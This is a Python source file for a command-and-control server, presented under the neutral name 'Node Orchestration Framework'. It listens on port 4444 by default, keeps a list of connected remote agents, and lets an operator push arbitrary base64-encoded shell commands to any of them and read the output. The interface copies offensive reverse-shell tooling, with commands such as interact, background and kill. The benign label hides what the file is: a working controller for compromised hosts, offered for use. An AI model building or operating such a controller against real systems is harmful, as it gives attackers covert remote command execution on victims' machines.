#!/usr/bin/env python3
"""
Distributed Node Orchestration Framework — Controller (Server)

Async TCP server that manages multiple agent connections and provides
an interactive command shell to task individual agents.
"""

import asyncio
import base64
import sys
import threading

# ── Global state ──────────────────────────────────────────────────────────────
agents: dict[int, tuple[asyncio.StreamReader, asyncio.StreamWriter, str]] = {}
agent_counter: int = 0
counter_lock = threading.Lock()
loop_ref: asyncio.AbstractEventLoop | None = None

BANNER = r"""
  ╔══════════════════════════════════════════════════════╗
  ║       NODE ORCHESTRATION FRAMEWORK — CONTROLLER      ║
  ╠══════════════════════════════════════════════════════╣
  ║  Commands:                                           ║
  ║    list             — Show connected agents          ║
  ║    interact <id>    — Send commands to an agent      ║
  ║    kill <id>        — Disconnect an agent            ║
  ║    exit             — Shut down the controller       ║
  ╚══════════════════════════════════════════════════════╝
"""


# ── Helpers ───────────────────────────────────────────────────────────────────
def b64_encode(data: str) -> bytes:
    """Encode a string to Base64, terminated with a newline delimiter."""
    return base64.b64encode(data.encode()) + b"\n"


def b64_decode(data: bytes) -> str:
    """Decode Base64 bytes back to a string."""
    return base64.b64decode(data.strip()).decode(errors="replace")


# ── Agent connection handler ──────────────────────────────────────────────────
async def handle_agent(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    """Called once per new agent connection."""
    global agent_counter

    peername = writer.get_extra_info("peername")
    addr_str = f"{peername[0]}:{peername[1]}" if peername else "unknown"

    with counter_lock:
        agent_counter += 1
        agent_id = agent_counter

    agents[agent_id] = (reader, writer, addr_str)
    print(f"\n[+] Agent {agent_id} connected from {addr_str}")
    print("controller> ", end="", flush=True)

    # Keep the connection alive until it drops or is killed
    try:
        while True:
            # We just wait; commands are sent from the interactive loop.
            chunk = await reader.read(1)
            if not chunk:
                break
            await asyncio.sleep(0.1)
    except (asyncio.CancelledError, ConnectionResetError, OSError):
        pass
    finally:
        agents.pop(agent_id, None)
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass
        print(f"\n[-] Agent {agent_id} ({addr_str}) disconnected")
        print("controller> ", end="", flush=True)


# ── Send command to an agent and receive the response ─────────────────────────
async def send_command(agent_id: int, command: str) -> str | None:
    """Send a Base64-encoded command to *agent_id* and return the decoded reply."""
    entry = agents.get(agent_id)
    if entry is None:
        return None

    reader, writer, _ = entry
    try:
        writer.write(b64_encode(command))
        await writer.drain()

        # Read until newline (our delimiter)
        response_raw = await asyncio.wait_for(reader.readline(), timeout=60)
        if not response_raw:
            return "[!] Agent disconnected before replying."
        return b64_decode(response_raw)
    except asyncio.TimeoutError:
        return "[!] Timeout waiting for agent response."
    except (ConnectionResetError, OSError) as exc:
        agents.pop(agent_id, None)
        return f"[!] Connection lost: {exc}"


# ── Interactive CLI ───────────────────────────────────────────────────────────
def interactive_shell(loop: asyncio.AbstractEventLoop):
    """Blocking interactive prompt — runs in a background thread."""
    print(BANNER)

    while True:
        try:
            raw = input("controller> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Shutting down…")
            loop.call_soon_threadsafe(loop.stop)
            return

        if not raw:
            continue

        parts = raw.split()
        cmd = parts[0].lower()

        # ── list ──────────────────────────────────────────────────────────
        if cmd == "list":
            if not agents:
                print("[*] No agents connected.")
            else:
                print(f"\n{'ID':<6} {'Address':<25} {'Status'}")
                print("─" * 45)
                for aid, (_, _, addr) in agents.items():
                    print(f"{aid:<6} {addr:<25} Active")
                print()

        # ── interact <id> ─────────────────────────────────────────────────
        elif cmd == "interact" and len(parts) == 2:
            try:
                target_id = int(parts[1])
            except ValueError:
                print("[!] Invalid agent ID.")
                continue

            if target_id not in agents:
                print(f"[!] Agent {target_id} is not connected.")
                continue

            _, _, addr = agents[target_id]
            print(f"[*] Interacting with Agent {target_id} ({addr})")
            print("[*] Type 'background' to return to the main menu.\n")

            while True:
                try:
                    agent_cmd = input(f"agent({target_id})> ").strip()
                except (EOFError, KeyboardInterrupt):
                    print()
                    break

                if not agent_cmd:
                    continue
                if agent_cmd.lower() == "background":
                    break

                future = asyncio.run_coroutine_threadsafe(
                    send_command(target_id, agent_cmd), loop
                )
                result = future.result()  # blocks until response arrives

                if result is None:
                    print(f"[!] Agent {target_id} is no longer connected.")
                    break
                print(result)

        # ── kill <id> ─────────────────────────────────────────────────────
        elif cmd == "kill" and len(parts) == 2:
            try:
                target_id = int(parts[1])
            except ValueError:
                print("[!] Invalid agent ID.")
                continue

            entry = agents.pop(target_id, None)
            if entry is None:
                print(f"[!] Agent {target_id} not found.")
            else:
                _, writer, addr = entry
                writer.close()
                print(f"[*] Agent {target_id} ({addr}) terminated.")

        # ── exit ──────────────────────────────────────────────────────────
        elif cmd == "exit":
            print("[*] Shutting down controller…")
            # Close all agent connections
            for aid in list(agents.keys()):
                entry = agents.pop(aid, None)
                if entry:
                    entry[1].close()
            loop.call_soon_threadsafe(loop.stop)
            return

        else:
            print("[!] Unknown command. Type 'list', 'interact <id>', 'kill <id>', or 'exit'.")


# ── Entry point ───────────────────────────────────────────────────────────────
async def main():
    global loop_ref

    host = input("[?] Bind address (default 0.0.0.0): ").strip() or "0.0.0.0"
    port_str = input("[?] Bind port (default 4444): ").strip() or "4444"

    try:
        port = int(port_str)
    except ValueError:
        print("[!] Invalid port number.")
        sys.exit(1)

    loop_ref = asyncio.get_running_loop()

    server = await asyncio.start_server(handle_agent, host, port)
    print(f"[*] Controller listening on {host}:{port}")

    # Launch the interactive shell in a thread so it doesn't block asyncio
    shell_thread = threading.Thread(
        target=interactive_shell, args=(loop_ref,), daemon=True
    )
    shell_thread.start()

    try:
        await server.serve_forever()
    except asyncio.CancelledError:
        pass
    finally:
        server.close()
        await server.wait_closed()
        print("[*] Controller stopped.")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        print("\n[*] Controller terminated.")
